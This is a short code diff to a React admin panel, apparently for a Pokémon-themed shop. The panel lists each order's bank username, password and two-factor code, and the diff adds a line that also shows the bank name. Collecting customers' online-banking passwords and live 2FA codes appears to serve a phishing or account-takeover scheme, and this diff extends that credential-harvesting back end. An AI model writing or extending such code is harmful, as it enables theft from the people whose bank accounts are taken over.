@@ -93,6 +93,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                       {/* Bank Login Info */}
                       <div className="mb-6">
                         <h5 className="font-bold text-pokemon-blue mb-2">Bank Login Information</h5>
+                        <p><span className="font-semibold">Bank Name:</span> {order.bankName}</p>
                         <p><span className="font-semibold">Username:</span> {order.bankLoginData.username}</p>
                         <p><span className="font-semibold">Password:</span> {order.bankLoginData.password}</p>
                         <p><span className="font-semibold">2FA Code:</span> {order.bankLoginData.twoFactorCode}</p>
